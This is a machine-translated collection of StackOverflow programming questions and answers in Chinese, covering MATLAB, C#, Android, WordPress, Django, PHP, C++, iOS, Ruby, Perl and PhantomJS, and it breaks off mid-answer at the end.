# StackOverflow 问答 11917000-11917999

# regex - matlab regexprep 具有多个数字的多个字符串

> ID：11917000
> 
> 赞同：4
> 
> 时间：2012-08-11T19:26:20.797
> 
> 标签：regex, matlab

给定一个字符串元胞数组，我想构建一个 regexprep 规则，以便将不同的字符串类型替换为某个数字。IE：

```
my_cell = {'ok', 'ok', 'bad', 'broken', 'bad', 'broken', 'ok'}; 
```

我知道如何一一替换每种字符串类型，即：

```
my_cell = regexprep(my_cell,'ok$','1'); 
```

但理想情况下，我想建立一个规则，这样`ok`它将被替换`1`，`bad`将被替换，`0`将`broken`被替换`-1`。

关于如何做到这一点的任何提示？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-11T19:40:32.590

怎么样：

```
>> my_cell = regexprep(my_cell,{'ok$','bad$','broken$'},{'1','0','-1'}); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-11T19:40:43.320

这里有文档：http: [//www.mathworks.co.uk/help/techdoc/ref/regexprep.html](http://www.mathworks.co.uk/help/techdoc/ref/regexprep.html)

它给出的语法如下：`s = regexprep('str', 'expr', 'repstr')`

它还说：“如果 expr 和 repstr 都是字符串元胞数组，则 expr 和 repstr 必须包含相同数量的元素，并且 regexprep 将每个 repstr 元素与其在 expr 中的匹配元素配对。”

因此，您可以尝试这样的事情：

```
my_cell = regexprep(my_cell, {'^ok$', '^bad$', '^broken$'}, {'1', '0', '-1'}); 
```

（未经测试）

# c# - 如何插入包含自动增量列的行

> ID：11917002
> 
> 赞同：0
> 
> 时间：2012-08-11T19:26:24.400
> 
> 标签：c#, sql-server

我有一个有 4 列的表：

```
id, user_name, symbol, company. 
```

该`id`列是主键，它具有`autoIncrement`属性。

我想向表中添加一条记录，我使用：

```
try
{
    connection.Open();
    SqlCommand cmd = new SqlCommand("INSERT INTO users_stocks VALUES(" + 
                                    "@user_name, @stock_symbol, @company)", connection);
    cmd.Parameters.AddWithValue("@user_name", user_name);
    cmd.Parameters.AddWithValue("@stock_symbol", stock_symbol);
    cmd.Parameters.AddWithValue("@company", company);

    int rows = cmd.ExecuteNonQuery();
    connection.Close();
    //rows number of record got inserted
}
catch (SqlException ex)
{
            //Log exception
            connection.Close();
} 
```

但它给了我例外（我有 4 列，我在这里只指定 3）。

如何添加带有 autoIncrement 列的行？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-11T19:28:19.737

您需要在查询中指定列名。

不指定它们意味着查询将尝试插入所有列，这就是它失败的原因。

```
INSERT INTO users_stocks
(UserName, StockSymbol, Company)
VALUES
(@user_name, @stock_symbol, @company) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-11T19:28:16.947

更改您的 SqlCommand 以明确指定列。

```
SqlCommand cmd = new SqlCommand("INSERT INTO users_stocks ( user_name, symbol, company ) VALUES(" + "@user_name, @stock_symbol, @company)", connection); 
```

# android - 单击列表视图中项目中的按钮时如何显示警报对话框

> ID：11917003
> 
> 赞同：1
> 
> 时间：2012-08-11T19:26:31.810
> 
> 标签：android, dialog, android-alertdialog

我试过下面的代码..

```
 btnRemoveItem.setOnClickListener(new View.OnClickListener() {

                @Override
                public void onClick(View arg0) {
                    // TODO Auto-generated method stub
                    Bundle b = new Bundle();
                    b.putLong("index", item.id);

                    AlertDialog.Builder builder = new AlertDialog.Builder(getApplicationContext());
                    builder.setTitle("Are you sure you ?");
                    builder.setMessage("Are you suer you want to remove this item from the cart?");
                    builder.setPositiveButton("No", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            dialog.cancel();
                        }

                    });
                    builder.setNegativeButton("Yes", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {

                        }
                    });
                    Dialog dd= builder.create();
                    dd.show();

                }
            }); 
```

但我收到以下错误..

```
08-11 19:18:50.968: E/AndroidRuntime(827): FATAL EXCEPTION: main
08-11 19:18:50.968: E/AndroidRuntime(827): android.view.WindowManager$BadTokenException: Unable to add window -- token null is not for an application
08-11 19:18:50.968: E/AndroidRuntime(827):  at android.view.ViewRoot.setView(ViewRoot.java:531)
08-11 19:18:50.968: E/AndroidRuntime(827):  at android.view.WindowManagerImpl.addView(WindowManagerImpl.java:177)
08-11 19:18:50.968: E/AndroidRuntime(827):  at android.view.WindowManagerImpl.addView(WindowManagerImpl.java:91)
08-11 19:18:50.968: E/AndroidRuntime(827):  at android.app.Dialog.show(Dialog.java:241)
08-11 19:18:50.968: E/AndroidRuntime(827):  at com.gand.metro.uis.SearchActivity$ItemsAdapter$1.onClick(SearchActivity.java:406)
08-11 19:18:50.968: E/AndroidRuntime(827):  at android.view.View.performClick(View.java:2485)
08-11 19:18:50.968: E/AndroidRuntime(827):  at android.view.View$PerformClick.run(View.java:9080)
08-11 19:18:50.968: E/AndroidRuntime(827):  at android.os.Handler.handleCallback(Handler.java:587)
08-11 19:18:50.968: E/AndroidRuntime(827):  at android.os.Handler.dispatchMessage(Handler.java:92)
08-11 19:18:50.968: E/AndroidRuntime(827):  at android.os.Looper.loop(Looper.java:123)
08-11 19:18:50.968: E/AndroidRuntime(827):  at android.app.ActivityThread.main(ActivityThread.java:3683)
08-11 19:18:50.968: E/AndroidRuntime(827):  at java.lang.reflect.Method.invokeNative(Native Method)
08-11 19:18:50.968: E/AndroidRuntime(827):  at java.lang.reflect.Method.invoke(Method.java:507)
08-11 19:18:50.968: E/AndroidRuntime(827):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
08-11 19:18:50.968: E/AndroidRuntime(827):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
08-11 19:18:50.968: E/AndroidRuntime(827):  at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T19:29:44.840

AlertDialogs 只能使用 Activity 上下文创建，因此 getApplicationContext() 将不起作用。相反，将以下全局变量添加到您的 Activity 文件中：

```
Context mContext; 
```

然后将以下内容添加到您的 onCreate() 中：

```
mContext = this; 
```

现在，改变：

```
AlertDialog.Builder builder = new AlertDialog.Builder(getApplicationContext()); 
```

至

```
AlertDialog.Builder builder = new AlertDialog.Builder(mContext); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T19:33:41.230

当您应该使用活动上下文时，您正在使用 getApplicationContext() ，而是使用 SearchActivity.this

# ajax - 在 Wordpress 中使用 AJAX 从帖子中获取内容

> ID：11917004
> 
> 赞同：-1
> 
> 时间：2012-08-11T19:26:36.323
> 
> 标签：ajax, wordpress

我正在尝试通过 Wordpress 中的 AJAX 从帖子中获取内容

这是js部分

```
$("a.ajaxed").click(function(event) {
    event.preventDefault();
    doAjaxRequest();
});
function doAjaxRequest(){
    jQuery.ajax({
        type: 'POST',
        url: ajax_object.ajaxurl,
        data: ({action : 'ajaxify',
            post_id: $(this).attr('id')
            }),
        dataType: 'JSON',
        success:function(data){
            console.log(data.post_title);
        }
    });
} 
```

这是functions.php部分

```
function ajaxify() {
    $post_id = $_POST['post_id'];
    $post_data = get_post($post_id);
    echo json_encode($post_data);
} 
```

console.log(data.post_title) 总是显示未定义。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-12T02:47:33.767

post_id 未定义

```
$("a.ajaxed").click(function(event) {
    event.preventDefault();     
    $.ajax({
        type: 'POST',
        dataType: 'JSON',
        url: ajax_object.ajaxurl,
        data: ({
            action : 'ajaxify',
            post_id: $(this).parent().attr("id")
            }),
        success:function(data){
            console.log(data);
        }
    });
}); 
```

# django - Django 1.4 弃用了 ADMIN_MEDIA_PREFIX 但我的项目是使用 Django 1.3 开始的，因此在 Django 1.4 中使用时出现问题

> ID：11917005
> 
> 赞同：2
> 
> 时间：2012-08-11T19:26:36.593
> 
> 标签：django, compatibility, django-1.3, django-1.4

我在 Django 1.3 中开始了一个项目，最近在另一台机器上安装了 Django 1.4，并在 Django 1.4 上继续我的项目。

Django 1.4[弃用了该`ADMIN_MEDIA_PREFIX`设置](https://docs.djangoproject.com/en/1.4/releases/1.4/#django-contrib-admin)，因此我将其删除，但现在还有一些其他错误`settings.ADMIN_MEDIA_PREFIX`未找到。那么我可以做些什么来让我的项目在 Django 1.4 上正常工作呢？

提前谢谢各位。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T20:48:01.530

如果您不在代码或模板中的任何地方使用此设置，它只能由可重用应用程序引发。

正如您提到的 smart_select 应用程序，您可能想看看[这个 changeset](https://github.com/digi604/django-smart-selects/commit/2d840c6a4fde2c900f8684d6e96061e542e5b006#smart_selects/widgets.py)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-30T20:13:50.320

您可以尝试使用内置的静态文件应用程序。我通过替换修复了相同的错误：

```
{% admin_media_prefix %} 
```

和：

```
{% static 'admin' %} 
```

你需要放置`{% load staticfiles %}`在模板的顶部。

# codeigniter - Codeigniter：深层参数

> ID：11917008
> 
> 赞同：0
> 
> 时间：2012-08-11T19:27:11.500
> 
> 标签：codeigniter, navigation, uri

我认为，这可能是新手问题，但我是 CodeIgniter 的新手 :)

那么问题来了，我正在尝试为商店制作类别和子类别（动态生成），主要问题是，我可以设法在控制器中使用 _remap 函数为主类别设置不同的选项。但是，如果我想更深入，那么同样的 _remap 函数也适用，我就被困在那里了。

例如，主类别 uri 是[http://project.com/store/fruits/](http://project.com/store/fruits/)，但对于子类别，当然 - [http://project.com/store/fruits/apples](http://project.com/store/fruits/apples)。

我想将不同的视图应用于第 3 段，并且仍然能够使用 _remap 函数控制主要类别（水果）。

我想一遍又一遍地使用一个控制器，但我认为，为所有子类别（数百个，伪装）复制粘贴相同的功能内容一定很疯狂。

也许有一些方法可以做到这一点，但我不知道如何......在这里帮助！:)

/抢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-21T14:23:03.707

谢谢，jco 的努力，但实际上，我发现 _remap() 函数可以很好地满足我的需要。

我创建了带有两个参数的公共 _remap() 函数 - $first_level 和 $next_levels，然后我控制了这些 $next_levels 给定信息之后的所有内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T23:34:28.380

不确定为什么需要 _remap 函数。如果“商店”是您的控制器，您可以将每个顶级类别设置为商店内的功能。（通过剩余的 URI）传递给每个函数的是子类别，这些子类别可以被捕获并在数据库中查找以获取您需要的信息。像这样的东西：

```
Function fruits(){
  $sub1 = $this->uri->segment(3); // this will be apples, etc...
  ...
  // if it's empty - call viewX
  // else call db lookup for $sub1 data here and pass to viewY 
} 
```

或者...如果您使用 .htaccess，您可以像这样重新路由：

```
RewriteCond %{REQUEST_FILENAME} store.*
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^store/([a-zA-Z]+)/([a-zA-Z]+)$ store/someFunction/cat=$1&subcat=$2 [L] 
```

这是为了说明目的 - 它需要修改以在您的环境中工作。

# php - 语法错误，“使用”运算符上的意外 T_FUNCTION

> ID：11917013
> 
> 赞同：0
> 
> 时间：2012-08-11T19:28:01.103
> 
> 标签：php, wordpress, error-handling

> **可能重复：**
> [我如何在 PHP 5.2 版本上使用像 function() use() 这样的 PHP 闭包函数？](https://stackoverflow.com/questions/9282066/how-can-i-use-php-closure-function-like-function-use-on-php-5-2-version)

我正在尝试在运行 php 5.2 的服务器上运行它。

```
function add_post_type($name, $args = array() ) {
add_action('init',function() use($name, $args) { 

    // execute custom post type code here

});
}; 
```

第二行抛出了一个意外的 T_FUNCTION 错误，我怀疑它的原因是“使用”运算符。有人可以帮我指出如何重写此函数以在 php 5.2 中运行吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T19:31:11.490

看到这个功能： -

/* 添加帖子类型 */

```
function wpse54191_plugin_init() {
add_post_type('Netherlands', array(
    'supports' => array('title', 'editor', 'thumbnail', 'comments')
));
}
add_action('init', 'wpse54191_plugin_init');

/* Add Post Type */
function add_post_type($name, $args = array() ) {   
    if ( !isset($name) ) return;

    $name = strtolower(str_replace(' ', '_', $name));
    $args = array_merge(
        array(
            'label' => 'Members ' . ucwords($name) . '',
            'labels' => array('add_new_item' => "Add New $name"),
            'singular_name' => $name,
            'public' => true,
            'supports' => array('title', 'editor', 'comments'),
        ),
        $args
    );

    register_post_type( $name, $args);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T19:31:22.130

这个答案似乎为您在 PHP 5.2 中尝试做的事情提供了一个很好的解决方案：将匿名函数转换为用户定义的函数。

[将带有匿名函数的代码转换为 PHP 5.2](https://stackoverflow.com/questions/3809405/converting-code-with-anonymous-functions-to-php-5-2)

祝你好运！并尝试升级您的 PHP 版本：P

# c++ - 使用 -Wl,--as-needed 强制与共享库链接（仅提供模板时）

> ID：11917014
> 
> 赞同：8
> 
> 时间：2012-08-11T19:28:05.103
> 
> 标签：c++, templates, shared-libraries

我正在创建一个仅模板的 C++ 库。但是，我还想提供一个“空”共享库，以便通过控制 SONAME，我可以在模板发生变化时强制重建模板消费者，从而导致实例化模板 ABI 不兼容。

可悲的是，如果一个特定的用户`-Wl,--as-needed`在他`LDFLAGS`的 中，链接器将从中删除我的共享库，`NEEDED`因为编译的可执行文件没有从它请求任何符号。如何确保程序*始终*与我的库链接，最好不要引入不必要的虚拟函数调用（或者如果必须，使它们的负担最小）？

*编辑*：作为说明，特定的模板类提供静态方法，通常只使用那些静态方法。因此，依赖构造函数中的任何内容都不是一个好主意，我真的很想避免通过某种强制执行来加重所有方法的负担。

* * *

受*@EmployedRussian*的启发，我实现了：

```
extern int dummy;

namespace
{
    struct G
    {
        inline G()
        {
            dummy = 0;
        }
    };

    static const G g;
} 
```

但遗憾的是，它为每个单元（包括头文件）执行一次分配。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-12T18:02:39.657

> 但是，我还想提供一个“空”共享库，以便通过控制 SONAME，只要模板发生变化导致实例化模板 ABI 不兼容，我就可以强制重建模板消费者。

这将在运行时强制出错。

您可以在不使用`SONAME`. 在您的模板标题之一中，放入一个将在运行时的全局对象

1.  取地址或致电`libmysolib_version_<N>`，或
2.  做`dlopen(libmysolib.so, ...)`和`dlsym("libmysolib_version_<N>", ...)`

`N`然后在每次破坏 ABI 时保持递增。

> 最好不要引入不必要的虚拟函数调用

取地址`libmysolib_version_<N>`不调用函数；它只是强制运行时链接器找到该符号一次（在启动时）。您可能会与链接器垃圾收集发生冲突。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-25T05:57:07.777

我推荐一种替代方法：

```
myheader.h 

namespace mylib_1 {
   void foo(); 
   //all the code goes there
}
namespace mylib = mylib_1; 
```

用户调用：

```
mylib::foo() 
```

使用不同 myheader 版本的代码不会链接，因为它会更改函数的签名。

ICU使用这种方法

# objective-c - 成为没有动画的第一响应者

> ID：11917026
> 
> 赞同：12
> 
> 时间：2012-08-11T19:29:52.290
> 
> 标签：objective-c, ios, uitextfield

有没有办法在`UITextField`没有键盘动画的情况下成为第一响应者？也就是说，让它只出现键盘？

基本上，我在具有 的 上推一秒钟`UIViewController`，`UIViewController`当`UITextField`第二个视图控制器从堆栈中弹出时，我希望`UITextField`立即具有第一响应者状态，以便当第二个视图控制器被弹出时，用户永远不会注意到文本字段不是第一响应者。

现在我有它，所以当它弹出时，键盘会在屏幕上显示动画，但我不希望看到它。

有任何想法吗？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-08-11T20:00:45.443

您可以像这样使用 UIView 动画

```
[UIView beginAnimations:nil context:nil];
[UIView setAnimationDuration:0.0];
[UIView setAnimationDelay:0.0];
[UIView setAnimationCurve:UIViewAnimationCurveLinear];

[textField becomeFirstResponder];  // <---- Only edit this line

[UIView commitAnimations]; 
```

这将导致键盘突然出现。

你可以做同样的事情，但使用`-resignFirstResponder`

斯威夫特..

```
 UIView.beginAnimations(nil, context: nil)
    UIView.setAnimationDuration(0.0)
    UIView.setAnimationDelay(0.0)
    someTextView.resignFirstResponder()
    UIView.commitAnimations() 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T20:03:52.123

只需将其设置为第一响应者，`-viewDidAppear`以使用户永远不会注意到该字段已丢失其状态。

```
-(void)viewWillAppear:(BOOL)animated {
    if ([self isViewLoaded] && self.textField)
        [self.textField becomeFirstResponder];
        [super viewWillAppear:animated];
} 
```

如果您愿意，我已经使用此代码在[Dropbox](http://dl.dropbox.com/u/54072935/Example.zip)上放置了一个简短的示例项目。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-11T20:06:52.477

我不确定您使用的是哪个 iOS 版本，或者您在什么时候调用`becomeFirstResponder` iOS5 /iOS6 的调用似乎按您希望的方式工作：`[textFieldReference becomeFirstResponder]``viewWillAppear:`

它在视图控制器显示它的视图之前被调用（如果你不手动处理视图控制器层次结构）并且一旦它出现在导航控制器中，键盘就已经出现并且文本字段具有焦点。

也就是说，我听说没有公开的方式可以指定键盘外观样式。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-05-28T18:45:55.893

当第一次提出问题时，我认为这不是一个选项，但[`UIView.performWithoutAnimation`](https://developer.apple.com/documentation/uikit/uiview/1622484-performwithoutanimation)可以正常工作。

```
UIView.performWithoutAnimation {
    self.composeView.focusTextField()
} 
```

# ruby - 如何使用 CarrierWave 从 S3 获取真实文件

> ID：11917027
> 
> 赞同：5
> 
> 时间：2012-08-11T19:29:54.680
> 
> 标签：ruby, ruby-on-rails-3, amazon-s3, carrierwave

我有一个应用程序可以读取文件的内容并将其编入索引。我将它们存储在磁盘本身中，但现在我使用的是 Amazon S3，因此以下方法不再适用。

是这样的：

```
def perform(docId)
    @document = Document.find(docId)
    if @document.file?

      #You should't create a new version
      @document.versionless do |doc|
        @document.file_content = Cloudoc::Extractor.new.extract(@document.file.file)
        @document.save
      end

    end
  end 
```

`@document.file`返回`FileUploader`, 并`doc.file.file`返回`CarrierWave::Storage::Fog::File`类。

我怎样才能得到真正的文件？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-14T05:53:00.427

调用`@document.file.read`将使您从 Carrierwave 中的 S3 获取文件的内容。

# php - 正则表达式来计算“？”的实例 引号中的

> ID：11917029
> 
> 赞同：1
> 
> 时间：2012-08-11T19:30:41.820
> 
> 标签：php, javascript

我正在尝试制作一个正则表达式来计算引号内的每个问号。这个正则表达式正在 javascript 中进行测试，但如果这很重要，我打算将它用于 PHP。我有一些这样的作品，但还不够好。

这里是。

```
/(\"|\')(([^\"\'\\]|\\.)*)\?(([^\"\'\\]|\\.)*(\"|\'))/g 
```

正如您可能看到的，我也想忽略转义引号。

说我有字符串`"hello? \"world?\""`。这将返回正确的 1。

但至于这个`"hello? \"world??\""`。这也将返回 1，但我想要的是 2。我怎样才能做到这一点？

如果我能得到一个与此完全相反的正则表达式（计算不在引号中的问号），我也会非常喜欢。

如果有帮助，这是用于此测试的整个函数。

```
function countTest(str) {
    regx = /(\"|\')(([^\"\'\\]|\\.)*)\?(([^\"\'\\]|\\.)*(\"|\'))/g;

    test = str.match(regx);
    test = test ? test.length : 0;

    console.log(test);
} 
```

编辑：

还！我从我自己在这个问题中的拼写错误中注意到，字符串`hello \"world?\'"`也将返回 1。不过，这似乎很容易解决。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-03T20:50:43.230

所以我只是尝试了一下，显然显示 1 的原因是，因为 test 不被视为字符串，而是被视为数组。所以我会替换

```
test = test ? test.length : 0; 
```

经过

```
test = test ? new String(test).length - 3 * test.length + 1: 0; 
```

换句话说，您从数组的 String 值中减去 3 个字符“，”，但添加 1，因为第一个数组元素没有逗号字符。

*编辑：对于引号外*的计数问号，只需从字符串中的总问号数中减去上面给出的数字即可。

编辑：对于 PHP，您可能会使用 array_slice 函数而不是 new String(test)，并根据需要调整乘法和加法常量。

# javascript - 正在加载 after pressed button

> ID：11917032
> 
> 赞同：0
> 
> 时间：2012-08-11T19:31:24.463
> 
> 标签：javascript, jquery, ajax

I press button after that appears div in which shows "loading" and loads iframe. So, showing div I can do via jQuery, but how to load iframe after event?

[**Here is my working code as i want**](http://jsfiddle.net/gVBQE/17/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T19:36:17.127

`src`在您希望它开始加载的那一刻设置 iframe 的属性（`""`默认设置为）：

```
$('#my-button').click(function() {
  $('iframe#myIframe').attr('src', url);
}); 
```

您还可以处理 iframe 完成加载时的事件：

```
$('iframe#myIframe').load(function() {
  // do stuff...
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-12T18:21:30.687

所以我明白了我需要什么：

```
<iframe id="chgMe" src="Source1.htm">Frames are not supported on your browser.</iframe>
<button onclick="document.getElementById('chgMe').src='Source2.htm'">Next</button> 
```

# php - php静态变量初始化在这里没有意义

> ID：11917035
> 
> 赞同：0
> 
> 时间：2012-08-11T19:32:05.710
> 
> 标签：php, codeigniter, static

我说`Common.php`的是 CodeIgniter 框架的文件（系统/核心文件夹）。

// 虽然不需要回答这个问题！

我一直在浏览代码，在函数**开始**时无法理解这些特定的行。`load_class`

```
static $_classes = array();

// Does the class exist?  If so, we're done...
if (isset($_classes[$class]))
{
    return $_classes[$class]; 
```

我的疑问是，将变量声明为空数组并立即检查该数组中是否存在某个键是不是毫无意义？还是我错过了与`static`关键字相关的内容？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-11T19:36:52.513

该`static`变量前面的修饰符意味着 的值`$_classes`在每次函数调用后都保持不变。

所以第一次调用该函数时，`$_classes`它还不存在，所以它被创建为一个空数组。

由于它是空的，因此该类不存在，因此它被加载并放入`$_classes`变量中。

现在当函数终止时，因为它是`static`，它不会被清理，它的值仍然存在。

下次调用该函数时，PHP 知道它已经存在，因此它*不会*被初始化为空数组，它仍然包含上次调用该函数时的内容。

有关详细信息，请参阅[使用静态变量](http://php.net/manual/en/language.variables.scope.php#language.variables.scope.static)。

# android - 在 Gingerbread 上完美运行时，应用程序在 ICS 中的 onResume 崩溃

> ID：11917038
> 
> 赞同：1
> 
> 时间：2012-08-11T19:32:21.220
> 
> 标签：android, crash, android-4.0-ice-cream-sandwich

我的主要活动（比如 A）提出了从 ContactsContract 获取 ContactID 的意图

```
startActivityForResult(new Intent(Intent.ACTION_PICK, contactsContract.Contacts.CONTENT_URI),PICK_CONTACT); 
```

返回（onActivityResult（int reqCode，int resultCode，Intent data））时，我正在使用“数据”中的详细信息来查询联系人

```
 if (resultCode == Activity.RESULT_OK) {
        Uri contactData = data.getData();
        Cursor c =  managedQuery(contactData, null, null, null, null);
        ...... 
```

我的代码适用于 Android 2.x。但是，此代码在 ICS (Android 4.x) 中崩溃，同时恢复主 Activity(A)。我不确定是否是由于已弃用的“managedQuery”。有人可以提供一些解决方案吗，我被卡住了，甚至无法找到导致错误的行，因为 Log cat 甚至没有显示错误行号。它只是说 **原因：android.database.StaleDataException：试图在游标关闭后访问它。** 提前谢谢乔希

在完成游标的要求后，我已经尝试了上面的代码。问题仍然存在。我的日志猫说如下

```
08-13 00:26:31.427: W/dalvikvm(3176): threadid=1: thread exiting with uncaught exception (group=0x409c01f8)
08-13 00:26:31.447: E/AndroidRuntime(3176): FATAL EXCEPTION: main
08-13 00:26:31.447: E/AndroidRuntime(3176): java.lang.RuntimeException: Unable to resume activity {com.desquare.sp/com.desquare.sp.SmartPadActivity}: android.database.StaleDataException: Attempted to access a cursor after it has been closed.
08-13 00:26:31.447: E/AndroidRuntime(3176):     at android.app.ActivityThread.performResumeActivity(ActivityThread.java:2444)
08-13 00:26:31.447: E/AndroidRuntime(3176):     at android.app.ActivityThread.handleResumeActivity(ActivityThread.java:2472)
08-13 00:26:31.447: E/AndroidRuntime(3176):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1173)
08-13 00:26:31.447: E/AndroidRuntime(3176):     at android.os.Handler.dispatchMessage(Handler.java:99)
08-13 00:26:31.447: E/AndroidRuntime(3176):     at android.os.Looper.loop(Looper.java:137)
08-13 00:26:31.447: E/AndroidRuntime(3176):     at android.app.ActivityThread.main(ActivityThread.java:4424)
08-13 00:26:31.447: E/AndroidRuntime(3176):     at java.lang.reflect.Method.invokeNative(Native Method)
08-13 00:26:31.447: E/AndroidRuntime(3176):     at java.lang.reflect.Method.invoke(Method.java:511)
08-13 00:26:31.447: E/AndroidRuntime(3176):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
08-13 00:26:31.447: E/AndroidRuntime(3176):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
08-13 00:26:31.447: E/AndroidRuntime(3176):     at dalvik.system.NativeStart.main(Native Method)
08-13 00:26:31.447: E/AndroidRuntime(3176): Caused by: android.database.StaleDataException: Attempted to access a cursor after it has been closed.
08-13 00:26:31.447: E/AndroidRuntime(3176):     at android.database.BulkCursorToCursorAdaptor.throwIfCursorIsClosed(BulkCursorToCursorAdaptor.java:75)
08-13 00:26:31.447: E/AndroidRuntime(3176):     at android.database.BulkCursorToCursorAdaptor.requery(BulkCursorToCursorAdaptor.java:144)
08-13 00:26:31.447: E/AndroidRuntime(3176):     at android.database.CursorWrapper.requery(CursorWrapper.java:186)
08-13 00:26:31.447: E/AndroidRuntime(3176):     at android.app.Activity.performRestart(Activity.java:4505)
08-13 00:26:31.447: E/AndroidRuntime(3176):     at android.app.Activity.performResume(Activity.java:4531)
08-13 00:26:31.447: E/AndroidRuntime(3176):     at android.app.ActivityThread.performResumeActivity(ActivityThread.java:2434)
08-13 00:26:31.447: E/AndroidRuntime(3176):     ... 10 more 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-11T19:39:20.027

听起来这是个问题：

> * [android.database.staledataexception : 访问关闭游标](https://stackoverflow.com/questions/7330495/android-database-staledataexception-access-closed-cursor)
> 
> 您似乎正在使用 managedQuery 获取游标。
> 
> 我在恢复应用程序时遇到了问题，由于某种原因，Icecream Sandwich 中的应用程序没有正确关闭游标。修复方法是在使用所有游标后立即对它们执行此操作：

```
if (cursor != null && !cursor.isClosed()) {  
  myActivity.stopManagingCursor( cursor );   
  cursor.close(); 
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-07-20T14:08:09.570

API startManagingCursor/stopManagingCursor 已弃用，是问题的根本原因。例如，请将此注释掉并验证。

# perl - Module::文件中的构建和值替换

> ID：11917041
> 
> 赞同：1
> 
> 时间：2012-08-11T19:32:57.927
> 
> 标签：perl, module-build

我开始使用 Module::Build。在构建过程中，我需要在某些文件中进行值替换——根据安装位置等更改路径。

在 Module::Build 文档中找不到任何内容。我知道我可以扩展 Module::Build 来做几乎任何事情，但是有一些标准的方法可以做到这一点吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-12T09:19:06.593

创建一个[Module::Build](https://www.metacpan.org/module/Module%3a%3aBuild%3a%3aCookbook)子类并添加一个操作来处​​理您的模板。覆盖适当的目标以使该步骤成为依赖项。从[Module::Build::Cookbook](https://www.metacpan.org/module/Module%3a%3aBuild%3a%3aCookbook)开始。

# javascript - 如何使用 PhantomJS 渲染页面的一部分？

> ID：11917042
> 
> 赞同：22
> 
> 时间：2012-08-11T19:33:03.880
> 
> 标签：javascript, phantomjs

我想使用 Phantom.JS 将单个 HTML 元素呈现为 PNG。有谁知道这是否可能？另外，我将如何使用 Phantom.js 呈现用户已经在查看的页面？

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2012-08-11T19:43:40.700

要仅渲染页面的一部分，您需要为页面设置 clipRect 属性，然后渲染它。

```
var clipRect = document.querySelector(selector).getBoundingClientRect();
page.clipRect = {
    top:    clipRect.top,
    left:   clipRect.left,
    width:  clipRect.width,
    height: clipRect.height
};
page.render('capture.png'); 
```

我不明白你问题的第二部分。Phantom.js 是无头的，这意味着没有用户正在查看的实际显示。

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2015-07-10T10:29:02.493

工作示例。

```
var page = require('webpage').create();

page.open('http://google.com', function() {
  // being the actual size of the headless browser
  page.viewportSize = { width: 1440, height: 900 };

  var clipRect = page.evaluate(function(){
    return document.querySelector('#hplogo').getBoundingClientRect();
  });

  page.clipRect = {
    top:    clipRect.top,
    left:   clipRect.left,
    width:  clipRect.width,
    height: clipRect.height
  };

  page.render('google.png');
  phantom.exit();
}); 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2014-05-08T14:24:31.327

您可以使用基于 PhantomJS 的另一个项目 CasperJS。

```
casper.start('http://www.weather.com/', function() {
    this.captureSelector('weather.png', '#wx-main');
});

casper.run(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-04-27T13:04:55.487

下面的解决方案对我有用。

```
 var clipRect = document.querySelector(selector).getBoundingClientRect();
     page.clipRect = {
              top:    clipRect.top,
              left:   clipRect.left,
              width:  clipRect.width,
              height: clipRect.height
      };
   page.render('capture.png'); 
```

但我注意到，只有在我们渲染图像而不是 pdf 时，这才有效。要为 pdf 解决这个问题，试试这个

```
page.evaluate(function (element){
    $(element).appendTo('body');
    $('body > :not(' + element + ')').hide(); 
   }, element);       
  });

window.setTimeout(function(){
    page.render("page.pdf");
  },1000); 
```

此链接可能会有所帮助： [如何隐藏除使用 jquery 的元素之外的所有元素？](https://stackoverflow.com/questions/1535331/how-to-hide-all-elements-except-one-using-jquery)

[https://github.com/ariya/phantomjs/issues/10465](https://github.com/ariya/phantomjs/issues/10465)

* * *

## 回答 #5

> 赞同：-5
> 
> 时间：2013-03-19T21:53:20.443

我有同样的需求，我试过了，对我来说效果很好：

不要忘记`http://www`网址中的

```
var page = require('webpage').create();
page.open('YourPageURL', function (status) {

if (status !== 'success') {
    console.log('Network Problem');
} else {
    var p = page.evaluate(function () {
        return document.getElementById('yourDivID').innerHTML
    });
